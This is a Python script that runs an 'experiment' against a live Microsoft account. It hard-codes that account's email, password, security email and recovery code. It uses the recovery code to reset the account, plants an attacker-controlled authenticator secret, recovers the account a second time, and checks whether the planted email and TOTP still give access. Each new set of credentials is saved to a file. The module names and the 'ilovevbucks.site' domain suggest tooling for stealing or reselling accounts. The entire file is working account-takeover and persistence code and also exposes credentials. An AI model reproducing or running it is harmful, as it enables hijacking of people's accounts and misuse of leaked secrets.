#!/usr/bin/env python3
"""Experiment: does a planted security-email survive RC-only RecoverUser?

Matches the classic pullback pattern:
  - Attacker plant = current security email (OLD_SEC) we control
  - Victim takes account using recovery code only (RecoverUser)
  - Does OLD_SEC remain usable without the new password/RC?

Also attempts (best-effort) to plant TOTP *after* RecoverUser (session often
has privilege), then RecoverUser a *second* time to test TOTP survival.
"""
from __future__ import annotations

import asyncio
import json
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from database.database import DBConnection
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.autobuy_hold_check import fetch_credential_type
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.cookies.safe_cookies import has_cookie
from securing.utils.login_authenticator import login_authenticator
from securing.utils.login_pwd import login_pwd
from securing.utils.proxy import close_session
from securing.utils.security.add_authenticator import add_authenticator
from securing.utils.security.password_gen import generate_ms_password
from securing.utils.security.recovery import recover, verify_password_works

EMAIL = "mcfa.uhtn6av7@outlook.com"
OLD_PWD = "FjU3K9ZG7LuxCg"
OLD_SEC = "0c33a830a1754f1f@ilovevbucks.site"  # treated as attacker plant
OLD_RC = "5KVF4-PVN82-38UM4-VKJ6N-N5PDS"
DOMAIN = "ilovevbucks.site"

OUT = Path(__file__).resolve().parents[1] / "forensics" / "rc_only_survival_experiment.json"
CREDS_OUT = Path(__file__).resolve().parents[1] / "forensics" / "mcfa_LIVE_CREDS_after_experiment.txt"


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _gct_snap(gct: dict | None) -> dict:
    c = (gct or {}).get("Credentials") or {}
    return {
        "HasPhone": c.get("HasPhone"),
        "HasFido": c.get("HasFido"),
        "HasRemoteNGC": c.get("HasRemoteNGC"),
        "HasPassword": c.get("HasPassword"),
        "PrefCredential": c.get("PrefCredential"),
        "OtcLoginEligibleProofs": c.get("OtcLoginEligibleProofs"),
        "all_keys": sorted(c.keys()) if c else [],
    }


def _otc_displays(snap: dict) -> list[str]:
    return [
        str(p.get("display"))
        for p in (snap.get("OtcLoginEligibleProofs") or [])
        if isinstance(p, dict)
    ]


def _has_prefix(displays: list[str], email: str) -> bool:
    pref = email[:2].lower()
    dom = email.split("@")[-1].lower()
    return any(d.lower().startswith(pref) and dom in d.lower() for d in displays)


def _save_creds(report: dict) -> None:
    after = (report.get("credentials") or {}).get("after") or {}
    if not after.get("password"):
        return
    CREDS_OUT.write_text(
        "\n".join(
            [
                f"email={EMAIL}",
                f"password={after.get('password')}",
                f"security_email={after.get('security_email')}",
                f"recovery_code={after.get('recovery_code')}",
                f"planted_totp={after.get('planted_totp_secret')}",
                f"updated={_now()}",
            ]
        )
        + "\n"
    )
    OUT.write_text(json.dumps(report, indent=2, default=str))


async def _login_pwd(session, email: str, password: str) -> bool:
    live = await livedata(session)
    page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
    msa = get_data(page)
    handled = await handle_redirects(session, page)
    if isinstance(handled, dict) and handled.get("urlPost"):
        msa = handled
    elif isinstance(handled, str):
        msa = get_data(handled) or msa
    if not msa or not msa.get("urlPost"):
        if has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth"):
            msa = {"_cookies_only": True}
        else:
            return False
    await polish_host(session, msa)
    return True


async def main():
    report: dict = {
        "experiment": "security_email_plant_survives_RC_only_RecoverUser",
        "started": _now(),
        "account": EMAIL,
        "credentials": {
            "before": {
                "password": OLD_PWD,
                "security_email_as_plant": OLD_SEC,
                "recovery_code": OLD_RC,
            }
        },
        "phases": {},
        "access_tests": {},
    }

    print("=== Phase 0: baseline (plant = current security email) ===")
    g0 = _gct_snap(await fetch_credential_type(EMAIL))
    report["phases"]["0_baseline"] = g0
    print("OTC:", _otc_displays(g0), "HasPhone:", g0.get("HasPhone"))

    # --- Phase 1: RecoverUser with RC only (victim takeover) ---
    print("=== Phase 1: RecoverUser RC-only → new pwd/RC/sec email ===")
    new_pwd = generate_ms_password(14)
    new_sec = f"{uuid.uuid4().hex[:16]}@{DOMAIN}"
    with DBConnection() as db:
        db.add_security_email(new_sec, new_pwd)

    session = get_session()
    try:
        new_rc = await recover(session, EMAIL, OLD_RC, new_sec, new_pwd)
        ok = bool(new_rc) and new_rc != "invalid"
        report["phases"]["1_recover"] = {
            "ok": ok,
            "new_recovery_code": new_rc,
            "new_password": new_pwd,
            "new_security_email": new_sec,
            "skipped": ["remove_proof", "logout_all", "add_authenticator"],
        }
        if not ok:
            report["error"] = "RecoverUser failed"
            _save_creds(report)
            print("RecoverUser FAILED")
            return

        report["credentials"]["after"] = {
            "password": new_pwd,
            "security_email": new_sec,
            "recovery_code": new_rc,
            "old_password": OLD_PWD,
            "old_security_email_plant": OLD_SEC,
            "old_rc_burned": OLD_RC,
        }
        _save_creds(report)
        print(f"[+] Recover OK rc={new_rc} sec={new_sec}")

        stuck = await verify_password_works(session, EMAIL, new_pwd)
        report["phases"]["1_password_stuck"] = stuck
        print("Password stuck:", stuck)

        await asyncio.sleep(2)
        g1 = _gct_snap(await fetch_credential_type(EMAIL))
        report["phases"]["1_gct_after_recover"] = g1
        displays = _otc_displays(g1)
        print("OTC after recover:", displays)
        report["access_tests"]["old_plant_email_still_in_GCT_OTC"] = _has_prefix(
            displays, OLD_SEC
        )
        report["access_tests"]["new_sec_email_in_GCT_OTC"] = _has_prefix(
            displays, new_sec
        )
        print(
            "Old plant in OTC?",
            report["access_tests"]["old_plant_email_still_in_GCT_OTC"],
            "| New sec in OTC?",
            report["access_tests"]["new_sec_email_in_GCT_OTC"],
        )
    finally:
        await close_session(session)

    # --- Phase 2: can OLD plant email still get login OTC (no new password)? ---
    print("=== Phase 2: try OTP login via OLD plant email (no new pwd) ===")
    session = get_session()
    try:
        info = await send_auth(session, EMAIL)
        report["access_tests"]["send_auth_after_recover"] = {
            "type": (info or {}).get("type") if isinstance(info, dict) else None,
            "display": (info or {}).get("display") if isinstance(info, dict) else None,
            "keys": list(info.keys()) if isinstance(info, dict) else None,
        }
        # Inspect which proof MS would use
        resp = (info or {}).get("response") or {}
        otc = (resp.get("Credentials") or {}).get("OtcLoginEligibleProofs") or []
        report["access_tests"]["send_auth_otc_list"] = [
            {"display": p.get("display"), "type": p.get("type"), "isDefault": p.get("isDefault")}
            for p in otc
            if isinstance(p, dict)
        ]
        print("send_auth type:", report["access_tests"]["send_auth_after_recover"])
        print("OTC list:", report["access_tests"]["send_auth_otc_list"])

        # If old plant still listed, try to receive a code in that mailbox
        if report["access_tests"].get("old_plant_email_still_in_GCT_OTC"):
            print("[!] Old plant still listed — waiting for OTP in OLD_SEC mailbox…")
            # Trigger OTC send if send_auth has a flow; else just poll mailbox briefly
            code = await get_email_code(OLD_SEC, timeout=45)
            report["access_tests"]["old_plant_otp_received"] = {
                "received": bool(code),
                "code": code,
            }
            print("Old plant OTP:", code)
        else:
            report["access_tests"]["old_plant_otp_received"] = {
                "received": False,
                "skipped": "old plant not in GCT OTC — RecoverUser replaced it",
            }
            # Also confirm new sec CAN receive (control)
            print("Control: poll NEW sec mailbox briefly (may be empty if no send)")
            code = await get_email_code(new_sec, timeout=20)
            report["access_tests"]["new_sec_otp_probe"] = {
                "received": bool(code),
                "code": code,
            }
    except Exception as exc:
        report["access_tests"]["send_auth_error"] = repr(exc)
        print("send_auth error:", exc)
    finally:
        await close_session(session)

    # --- Phase 3: old password dead? ---
    print("=== Phase 3: old password login attempt ===")
    session = get_session()
    try:
        ok = await _login_pwd(session, EMAIL, OLD_PWD)
        # verify_password_works is cleaner
        await close_session(session)
        session = get_session()
        old_works = await verify_password_works(session, EMAIL, OLD_PWD)
        new_works = await verify_password_works(session, EMAIL, new_pwd)
        report["access_tests"]["old_password_works"] = old_works
        report["access_tests"]["new_password_works"] = new_works
        print("Old pwd works?", old_works, "| New pwd works?", new_works)
    except Exception as exc:
        report["access_tests"]["password_check_error"] = repr(exc)
    finally:
        await close_session(session)

    # --- Phase 4 (best-effort): plant TOTP on post-recover session, recover again ---
    print("=== Phase 4: best-effort plant TOTP then 2nd RecoverUser ===")
    plant_secret = None
    session = get_session()
    try:
        ok = await _login_pwd(session, EMAIL, new_pwd)
        report["phases"]["4_login_new"] = {"ok": ok}
        if ok:
            try:
                plant_secret = await add_authenticator(session)
                report["phases"]["4_plant_totp"] = {
                    "ok": True,
                    "secret": plant_secret,
                }
                print(f"[+] Planted TOTP after first recover: {plant_secret}")
                report["credentials"]["after"]["planted_totp_secret"] = plant_secret
                _save_creds(report)

                # Prove it works with new pwd
                await close_session(session)
                session = get_session()
                ctrl = await login_authenticator(
                    session,
                    EMAIL,
                    {"password": new_pwd, "auth_secret": plant_secret},
                )
                report["access_tests"]["totp_works_before_2nd_recover"] = {
                    "result": ctrl,
                    "ok": ctrl is True,
                }
                print("TOTP control before 2nd recover:", ctrl)
            except Exception as exc:
                report["phases"]["4_plant_totp"] = {"ok": False, "error": repr(exc)}
                print("TOTP plant failed (expected if SA blocked):", exc)
    finally:
        await close_session(session)

    if plant_secret and report["phases"].get("4_plant_totp", {}).get("ok"):
        print("=== Phase 4b: 2nd RecoverUser (RC-only) to test TOTP survival ===")
        pwd2 = generate_ms_password(14)
        sec2 = f"{uuid.uuid4().hex[:16]}@{DOMAIN}"
        rc1 = report["credentials"]["after"]["recovery_code"]
        with DBConnection() as db:
            db.add_security_email(sec2, pwd2)
        session = get_session()
        try:
            rc2 = await recover(session, EMAIL, rc1, sec2, pwd2)
            report["phases"]["4b_second_recover"] = {
                "ok": bool(rc2) and rc2 != "invalid",
                "new_recovery_code": rc2,
                "new_password": pwd2,
                "new_security_email": sec2,
            }
            if rc2 and rc2 != "invalid":
                report["credentials"]["after"] = {
                    "password": pwd2,
                    "security_email": sec2,
                    "recovery_code": rc2,
                    "planted_totp_secret": plant_secret,
                    "previous_password": new_pwd,
                    "previous_security_email": new_sec,
                    "previous_rc_burned": rc1,
                }
                _save_creds(report)
                stuck2 = await verify_password_works(session, EMAIL, pwd2)
                report["phases"]["4b_password_stuck"] = stuck2
                print("2nd recover OK, password stuck:", stuck2)

                await close_session(session)
                session = get_session()
                # TOTP + NEW password (survived as 2FA?)
                r_new = await login_authenticator(
                    session,
                    EMAIL,
                    {"password": pwd2, "auth_secret": plant_secret},
                )
                report["access_tests"]["totp_with_newest_password_after_2nd_recover"] = {
                    "result": r_new,
                    "ok": r_new is True,
                }
                print("TOTP + newest pwd after 2nd recover:", r_new)

                await close_session(session)
                session = get_session()
                # TOTP + PREVIOUS password (access without newest creds?)
                r_old = await login_authenticator(
                    session,
                    EMAIL,
                    {"password": new_pwd, "auth_secret": plant_secret},
                )
                report["access_tests"]["totp_with_previous_password_after_2nd_recover"] = {
                    "result": r_old,
                    "ok": r_old is True,
                }
                print("TOTP + previous pwd after 2nd recover:", r_old)

                g2 = _gct_snap(await fetch_credential_type(EMAIL))
                report["phases"]["4b_gct"] = g2
                print(
                    "GCT after 2nd recover HasRemoteNGC=",
                    g2.get("HasRemoteNGC"),
                    "OTC=",
                    _otc_displays(g2),
                )
        except Exception as exc:
            report["phases"]["4b_second_recover"] = {"error": repr(exc)}
            print("2nd recover error:", exc)
        finally:
            await close_session(session)

    # Verdict
    old_in_otc = report["access_tests"].get("old_plant_email_still_in_GCT_OTC")
    old_pwd = report["access_tests"].get("old_password_works")
    totp_surv = (report["access_tests"].get("totp_with_newest_password_after_2nd_recover") or {}).get("ok")
    totp_without_newest = (report["access_tests"].get("totp_with_previous_password_after_2nd_recover") or {}).get("ok")

    report["verdict"] = {
        "security_email_plant_survives_RC_only_RecoverUser": old_in_otc,
        "old_password_survives_RecoverUser": old_pwd,
        "attacker_access_without_new_credentials_via_old_email": bool(old_in_otc),
        "totp_plant_survives_RC_only_RecoverUser": totp_surv,
        "totp_allows_access_without_newest_password": bool(totp_without_newest),
        "HasPhone_unchanged": (
            (report.get("phases") or {}).get("1_gct_after_recover") or {}
        ).get("HasPhone"),
        "takeaway": (
            "If old_in_otc is False: RecoverUser replaces the default security-email "
            "OTC proof — RC-only takeover kills the previous recovery email plant. "
            "If totp_surv is True: authenticator is NOT cleared by RecoverUser alone "
            "— remove_proof is required. TOTP alone does not bypass the new password."
        ),
    }
    report["finished"] = _now()
    _save_creds(report)
    print("\n=== VERDICT ===")
    print(json.dumps(report["verdict"], indent=2))
    print(f"Creds: {CREDS_OUT}")
    print(f"Report: {OUT}")


if __name__ == "__main__":
    asyncio.run(main())
